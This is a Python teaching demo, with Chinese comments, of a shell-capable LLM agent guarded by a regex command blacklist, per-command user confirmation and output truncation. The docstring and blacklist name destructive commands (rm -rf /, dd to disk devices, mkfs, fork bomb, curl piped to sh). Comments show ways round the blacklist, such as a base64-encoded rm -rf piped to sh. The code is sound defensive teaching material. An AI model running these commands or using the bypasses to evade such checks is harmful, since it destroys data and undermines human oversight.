#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Demo7 - Agent 的安全边界（三道防线）

demo1 给了 Agent 一双"手"——execute_bash 能执行任意 shell 命令。但这也意味着：
    · rm -rf /              —— 删库跑路
    · dd of=/dev/sda        —— 复写磁盘
    · mkfs.ext4 /dev/sda1   —— 格式化分区
    · shutdown / reboot     —— 把机器关了
    · curl http://x | sh    —— 执行远程未审计脚本
    · 被幻觉 / 被注入诱导后执行的危险操作

真实的 Agent（如 Claude Code）都有"二次确认"——放开高危能力，但需要人盯着。
demo7 不再加新能力（工具列表与 demo1 完全一致），而是在**工具执行前后**加三道防线：

    ┌─────────────────────────────────────────────────────┐
    │  LLM 决策 → 调 execute_bash("rm -rf test_dir")      │
    │                     │                                │
    │             ┌───────▼────────┐                       │
    │             │ 防线1：黑名单  │  命中 → 直接拦截      │
    │             └───────┬────────┘                       │
    │                     │ 通过                           │
    │             ┌───────▼────────┐                       │
    │             │ 防线2：用户确认│  拒绝 → 跳过          │
    │             └───────┬────────┘                       │
    │                     │ 同意                           │
    │             ┌───────▼────────┐                       │
    │             │   实际执行     │                       │
    │             └───────┬────────┘                       │
    │             ┌───────▼────────┐                       │
    │             │ 防线3：截断输出│  超长 → 只取头尾      │
    │             └───────┬────────┘                       │
    │                     │                                │
    │              结果回灌 LLM                            │
    └─────────────────────────────────────────────────────┘

三道防线的局限（讲稿第 5 章详述）：
    · 黑名单靠正则，永远绕得过去（python -c "import os; os.remove(...)"）
    · 用户确认繁琐——execute_bash 每次都问，体验差
    · 截断按字符数，生产应按 token；可让大模型先做摘要再灌
    生产级做法（Claude Code 等）：命令精细分级 + 三选项放行 + Docker 沙箱 +
                        网络黑白名单 + pre/post-hook 架构（见讲稿第 6 章）

单文件按 6 个 Part 组织：
    Part 1: LLM 客户端初始化（沿用 demo1）
    Part 2: 工具定义（沿用 demo1 的 3 个工具：execute_bash / read_file / write_file）
    Part 3: 三道防线实现（★ demo7 核心新增）
    Part 4: 工具实现（带防线版——在 demo1 函数外包了一层安全壳）
    Part 5: Agent 主循环（沿用 demo1 的 ReAct）
    Part 6: 交互式入口

启动：
    python agent.py
"""

import os
import re
import subprocess

from anthropic import Anthropic


# ============================================================
# Part 1: 配置 + LLM 客户端初始化（沿用 demo1）
# ============================================================

# ↓↓↓ 只需改这一行 ↓↓↓
API_KEY = ""

# 默认配置（一般无需修改）
BASE_URL       = "https://open.bigmodel.cn/api/anthropic"   # 智谱 BigModel Anthropic 兼容网关
MODEL          = "glm-5.2"                                  # 模型名
API_TIMEOUT_MS = 3000000                                    # 单次请求超时（毫秒），50 分钟

# demo7 专属：项目目录——write_file 写到此目录外需要用户确认
PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))


def load_config() -> dict:
    return {
        "api_key":    os.environ.get("ANTHROPIC_API_KEY") or API_KEY,
        "base_url":   BASE_URL,
        "model":      MODEL,
        "timeout_ms": API_TIMEOUT_MS,
    }


def ensure_config() -> dict:
    config = load_config()
    if config["api_key"]:
        return config

    print("=" * 60)
    print("检测到尚未配置 API Key，请输入（仅本次运行有效）")
    print("如需持久化：请改 agent.py 顶部的 API_KEY 变量")
    print("=" * 60)

    api_key = input("\n请输入 API Key: ").strip()
    if not api_key:
        raise SystemExit("未提供 API Key，退出")

    config["api_key"] = api_key
    return config


client: Anthropic = None  # type: ignore


def init_client() -> None:
    global client
    config = ensure_config()
    client = Anthropic(
        api_key=config["api_key"],
        base_url=config["base_url"],
        timeout=config["timeout_ms"] / 1000.0,
    )


# ============================================================
# Part 2: 工具定义（沿用 demo1）
# ============================================================
# 与 demo1 完全一致：execute_bash / read_file / write_file。
# demo7 的重点是"工具怎么被执行"（Part 3 防线 + Part 4 带壳实现），
# 而不是"工具有哪些"——所以 schema 不变。

LOCAL_TOOLS = [
    {
        "name": "execute_bash",
        "description": "执行任意 shell 命令。注意：危险命令会被黑名单拦截，所有命令执行前需用户确认。",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "要执行的 shell 命令"},
            },
            "required": ["command"],
        },
    },
    {
        "name": "read_file",
        "description": "读取指定路径文件内容。超大文件会自动截断为头尾摘要。",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "要读取的文件路径"},
            },
            "required": ["path"],
        },
    },
    {
        "name": "write_file",
        "description": "写入文件，不存在则创建，存在则覆盖。写到项目目录外会要求用户确认。",
        "input_schema": {
            "type": "object",
            "properties": {
                "path":    {"type": "string", "description": "要写入的文件路径"},
                "content": {"type": "string", "description": "要写入的内容"},
            },
            "required": ["path", "content"],
        },
    },
]

SYSTEM_PROMPT = """你是一个有用的助手，可以通过工具与本地系统交互。

你有以下工具可以使用：
1. execute_bash: 执行 shell 命令（危险命令会被拦截，所有命令需用户确认）
2. read_file: 读取文件内容（超大文件自动截断为头尾）
3. write_file: 写入文件内容（写到项目目录外需用户确认）

请根据用户需求选择合适的工具完成任务，执行完毕后总结结果并回复用户。"""


# ============================================================
# Part 3: 三道防线实现（★ demo7 核心新增）
# ============================================================
# 三道防线对应三种风险：
#   防线 1（黑名单）：拦"绝对不让执行"的命令——rm -rf /、mkfs、dd of=/dev/、shutdown...
#   防线 2（确认）：  拦"理论上安全但要看一眼"的操作——execute_bash 每次都确认，
#                    write_file 写到项目外要确认
#   防线 3（截断）：  防止命令输出 / 文件内容太大爆掉上下文窗口——超过阈值只取头尾
#
# 为什么是这三道、为什么是这个顺序？
#   · 黑名单成本最低（一次 regex），所以放在最前
#   · 确认成本最高（要打断人），所以放在中间——黑名单没拦的才问
#   · 截断必须在执行之后（执行前不知道输出多大），所以放最后

# ---- 防线 1：黑名单 ----
# 用一组正则匹配高危命令。命中即拦——不问用户、不让大模型重试，直接返回拦截信息。
#
# 局限（讲稿第 5 章）：黑名单永远绕得过去——
#   · python -c "import os; os.remove('/xxx')"
#   · echo cm0gLXJmIC8= | base64 -d | sh
#   · 各种 shell 逃逸、变量拼接
# 所以黑名单只能挡"明显的高危"，真正兜底的是防线 2（用户确认）。

BLACKLIST_PATTERNS = [
    r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f)",           # rm -rf / rm -rvf
    r"\brm\s+(-[a-zA-Z]*f[a-zA-Z]*r)",           # rm -fr
    r"\brm\s+-\S*\s+\*\s*$",                     # rm *  (通配删除)
    r"\bdd\b.*\bof\s*=\s*/dev/(sd|nvme|hd)",     # dd of=/dev/sda  复写磁盘
    r"\bmkfs\.",                                  # mkfs.ext4 / mkfs.xfs  格式化
    r"\bshutdown\b",
    r"\breboot\b",
    r"\bhalt\b",
    r"\bpoweroff\b",
    r":\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",      # fork bomb  :(){:|:&};:
    r">\s*/dev/(sd|nvme|hd)",                    # cat x > /dev/sda  重定向到磁盘设备
    r"\bformat\s+[A-Z]:",                         # Windows format C:
    r"\bcurl\b.*\|\s*(sh|bash|python)",          # curl xxx | sh  执行远程脚本
    r"\bwget\b.*\|\s*(sh|bash|python)",
]

_BLACKLIST_RE = [re.compile(p, re.IGNORECASE) for p in BLACKLIST_PATTERNS]


def is_blacklisted(command: str) -> bool:
    """检查命令是否命中黑名单。命中返回 True。"""
    return any(rx.search(command) for rx in _BLACKLIST_RE)


# ---- 防线 2：用户确认 ----
# 黑名单之外的命令/操作，靠人盯。
# 策略：
#   · execute_bash：每次都问（不依赖大模型审核命令——它审不过来的）
#   · write_file：写到项目目录内放行；写到项目目录外要确认
#   · read_file：只读，直接放行
#
# 用户可选 [y/n/a]：y=本次同意，n=本次拒绝，a=本会话全部同意（免确认）
# （a 在 REPL 里维护一个全局开关，避免后续繁琐——讲稿第 6 章对比 Claude Code 的同类设计）

# 全局开关：本会话是否对所有 execute_bash 免确认
_auto_approve_bash = False


def confirm_action(prompt: str, auto_approve_ok: bool = False) -> bool:
    """
    交互式用户确认。

    Args:
        prompt:          给用户看的提示文本
        auto_approve_ok: 若全局免确认已开启，是否自动通过
                         （execute_bash 走免确认；write_file 路径越界永远问）

    Returns:
        True = 放行，False = 拒绝
    """
    global _auto_approve_bash
    if auto_approve_ok and _auto_approve_bash:
        print(f"[确认] 自动放行（已开启本次会话免确认）")
        return True

    print(f"\n[需要确认] {prompt}")
    while True:
        choice = input("  允许执行吗？[y/n/a] (y=本次允许, n=拒绝, a=本次会话全允许): ").strip().lower()
        if choice in {"y", "yes"}:
            return True
        if choice in {"n", "no", ""}:
            print(f"  [已拒绝]")
            return False
        if choice == "a":
            _auto_approve_bash = True
            print(f"  [已开启本次会话免确认]")
            return True
        print("  请输入 y / n / a")


def is_in_project_dir(path: str) -> bool:
    """判断路径是否在 PROJECT_DIR 内（用于 write_file 决策）。
    兼容 git bash 风格路径（/d/... → D:/...）。"""
    try:
        # 兼容 git bash 风格：/d/workspace/... → D:/workspace/...
        if len(path) >= 3 and path[0] == "/" and path[2] == "/" and path[1].isalpha():
            path = path[1].upper() + ":/" + path[3:]
        abs_path = os.path.abspath(path)
        return abs_path == PROJECT_DIR or abs_path.startswith(PROJECT_DIR + os.sep)
    except Exception:
        return False


# ---- 防线 3：输出截断 ----
# 场景：大模型 cat 一个 10G 日志、find / 列出全盘文件、read 一个超长脚本……
# 这些输出会原样塞进 messages，可能一次就把上下文顶爆，连压缩都来不及。
#
# 策略：看长度，超过阈值只取头尾。给大模型和展示都能看出大致内容。
#
# 阈值故意做成模块级常量——讲稿演示 2 会把它调小到 1000 来触发截断。

OUTPUT_TRUNCATE_THRESHOLD = 5000   # 超过此长度触发截断
OUTPUT_TRUNCATE_HEAD      = 2000   # 截断后保留前 N 字符
OUTPUT_TRUNCATE_TAIL      = 2000   # 截断后保留后 N 字符


def truncate_output(text: str,
                    threshold: int = OUTPUT_TRUNCATE_THRESHOLD,
                    head: int = OUTPUT_TRUNCATE_HEAD,
                    tail: int = OUTPUT_TRUNCATE_TAIL) -> str:
    """超长输出只取头尾，中间用省略标记替换。"""
    if len(text) <= threshold:
        return text
    return (
        text[:head]
        + f"\n\n... [内容已截断：共 {len(text)} 字符，"
        + f"仅显示头 {head} + 尾 {tail}]\n\n"
        + text[-tail:]
    )


# ============================================================
# Part 4: 工具实现（带防线版）
# ============================================================
# 与 demo1 同名同签的三个函数，但内部串了三道防线：
#     safe_execute_bash: 黑名单 → 用户确认 → subprocess → 截断
#     safe_read_file:    直接读 → 截断（读通常安全，无需确认）
#     safe_write_file:   路径检查 → 项目外确认 → 写
# 路由表 AVAILABLE_FUNCTIONS 指向这三个带壳实现，大模型看到的工具名不变。


def execute_bash(command: str) -> str:
    """
    带三道防线的 shell 执行。
    顺序：黑名单 → 用户确认 → 执行 → 截断。
    """
    # ---- 防线 1：黑名单 ----
    if is_blacklisted(command):
        return (
            f"[拦截] 命令命中黑名单，已拒绝执行：\n"
            f"  {command}\n"
            f"如需删除文件，请用更具体的路径（不要用通配符 / 根目录），"
            f"或用 Python 等方式逐个删除。"
        )

    # ---- 防线 2：用户确认 ----
    preview = command if len(command) <= 100 else command[:100] + "..."
    if not confirm_action(f"execute_bash: {preview}", auto_approve_ok=True):
        return f"[拒绝] 用户未允许执行：{command}"

    # ---- 实际执行 ----
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60,
        )
        output = []
        if result.stdout:
            output.append(result.stdout)
        if result.stderr:
            output.append(f"[stderr] {result.stderr}")
        if result.returncode != 0:
            output.append(f"[exit code: {result.returncode}]")
        raw = "\n".join(output) if output else "[命令执行成功，无输出]"
    except subprocess.TimeoutExpired:
        return "[错误] 命令执行超时（60 秒）"
    except Exception as e:
        return f"[错误] 命令执行失败: {e}"

    # ---- 防线 3：截断 ----
    return truncate_output(raw)


def read_file(path: str) -> str:
    """
    读文件——防线 3（截断）。
    读通常安全，无需确认；但仍要截断——read 一个 10G 文件一样能撑爆上下文。
    """
    try:
        if not os.path.exists(path):
            return f"[错误] 文件不存在: {path}"
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
    except UnicodeDecodeError:
        return "[错误] 文件不是有效的文本文件或编码不支持"
    except Exception as e:
        return f"[错误] 读取文件失败: {e}"

    return truncate_output(content)


def write_file(path: str, content: str) -> str:
    """
    写文件——防线 2（项目外确认）。
    写到 PROJECT_DIR 内：直接放行；写到外面：要用户确认。
    """
    if not is_in_project_dir(path):
        preview = content if len(content) <= 80 else content[:80] + "..."
        if not confirm_action(
            f"write_file 越界写入（项目外）：\n  路径: {path}\n  内容预览: {preview}",
            auto_approve_ok=False,   # 越界写永远问，不受免确认开关影响
        ):
            return f"[拒绝] 用户未允许越界写入：{path}"

    try:
        dir_path = os.path.dirname(path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return f"[成功] 文件已写入: {path} ({len(content)} 字符)"
    except Exception as e:
        return f"[错误] 写入文件失败: {e}"


AVAILABLE_FUNCTIONS = {
    "execute_bash": execute_bash,
    "read_file":    read_file,
    "write_file":   write_file,
}


# ============================================================
# Part 5: Agent 主循环（沿用 demo1 的 ReAct）
# ============================================================
# 与 demo1 完全一致——demo7 的变化全在工具实现（Part 4）里，
# 主循环只负责"大模型决策 → 工具执行 → 结果回灌"的轮转。

MAX_ITERATIONS = 30


def _preview(text: str, limit: int = 60) -> str:
    text = str(text).replace("\n", " ").strip()
    return text[:limit] + ("..." if len(text) > limit else "")


def _print_messages(messages: list) -> None:
    print(f"[messages] 当前 {len(messages)} 条消息")
    for i, msg in enumerate(messages):
        print(f"  [{i}] {msg['role']:<9}: {_preview(msg['content'])}")
    print()


def run_agent(user_input: str, verbose: bool = True) -> str:
    """与 demo1 同构的 ReAct 主循环。"""
    messages = [{"role": "user", "content": user_input}]

    for loop_idx in range(1, MAX_ITERATIONS + 1):
        if verbose:
            print(f"\n{'=' * 60}")
            print(f"第 {loop_idx} 轮 ReAct 循环")
            print(f"{'=' * 60}")
            _print_messages(messages)

        response = client.messages.create(
            model=MODEL,
            max_tokens=4096,
            system=SYSTEM_PROMPT,
            tools=LOCAL_TOOLS,
            messages=messages,
        )

        if verbose:
            print(f"\n[LLM 决策] stop_reason = {response.stop_reason}")
            for block in response.content:
                if block.type == "text":
                    print(f"  - text      : {_preview(block.text, 80)}")
                elif block.type == "tool_use":
                    print(f"  - tool_use  : {block.name}({block.input})")

        if response.stop_reason != "tool_use":
            if verbose:
                print(f"\n[循环结束] 大模型判断任务完成，退出循环")
            return "".join(b.text for b in response.content if b.type == "text")

        messages.append({"role": "assistant", "content": response.content})

        tool_results = []
        for block in response.content:
            if block.type != "tool_use":
                continue
            fn = AVAILABLE_FUNCTIONS.get(block.name)
            if fn is None:
                result = f"[错误] 未知工具: {block.name}"
            else:
                if verbose:
                    print(f"\n[执行工具] {block.name}({_preview(str(block.input), 80)})")
                result = fn(**block.input)

            if verbose:
                print(f"[工具结果] {_preview(result, 200)}")

            tool_results.append({
                "type": "tool_result",
                "tool_use_id": block.id,
                "content": str(result),
            })

        messages.append({"role": "user", "content": tool_results})

    return f"[错误] 超过最大循环次数（{MAX_ITERATIONS}），可能陷入死循环"


# ============================================================
# Part 6: 交互式入口
# ============================================================


def ensure_test_dir() -> str:
    """准备演示用的测试目录（4 个文件），返回路径。演示删除/清理任务时用。"""
    test_dir = os.path.join(PROJECT_DIR, "test_dir")
    os.makedirs(test_dir, exist_ok=True)
    for name in ("a.txt", "b.txt", "c.log", "d.tmp"):
        fp = os.path.join(test_dir, name)
        if not os.path.exists(fp):
            with open(fp, "w", encoding="utf-8") as f:
                f.write(f"this is {name}\n")
    return test_dir


def main():
    init_client()

    test_dir = ensure_test_dir()

    print("=" * 60)
    print("Demo7 Agent 已启动（安全边界版——三道防线）")
    print(f"模型:       {MODEL}")
    print(f"网关:       {BASE_URL}")
    print(f"项目目录:   {PROJECT_DIR}")
    print(f"测试目录:   {test_dir}（已准备好 4 个文件供演示删除/清理）")
    print(f"截断阈值:   {OUTPUT_TRUNCATE_THRESHOLD} 字符（头 {OUTPUT_TRUNCATE_HEAD} + 尾 {OUTPUT_TRUNCATE_TAIL}）")
    print("=" * 60)
    print("本节演示 Agent 的安全边界——三道防线（黑名单 / 确认 / 截断）。")
    print("演示建议：")
    print(f"  · 演示 1（黑名单+确认）：让 Agent 清理 {test_dir} 下的所有文件")
    print(f"  · 演示 2（截断）：       把 OUTPUT_TRUNCATE_THRESHOLD 调小到 1000，")
    print(f"                          让 Agent 读 agent.py 自己并总结（>1000 字符会截断）")
    print("命令：")
    print("  quit   退出")
    print("  其它   当作新任务输入")
    print("=" * 60)

    while True:
        try:
            user_input = input("\n用户: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n再见！")
            break

        if not user_input:
            continue
        if user_input.lower() in {"quit", "exit", "q"}:
            print("再见！")
            break

        try:
            final = run_agent(user_input, verbose=True)
            print(f"\n助手: {final}")
        except Exception as e:
            print(f"\n[错误] {e}")


if __name__ == "__main__":
    main()
